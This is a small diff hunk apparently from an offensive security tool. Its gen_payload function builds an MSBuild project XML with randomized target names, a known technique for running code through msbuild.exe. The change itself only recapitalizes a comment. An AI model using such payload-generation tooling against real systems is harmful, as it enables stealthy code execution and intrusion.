@@ -576,7 +576,7 @@ def gen_payload(share_name, payload_name, drive_letter):
     p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 15)))
 
     xml_payload = r"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe SimpleTasks.csproj -->
 	<Target Name="%s">
             <%s /> 
           </Target>
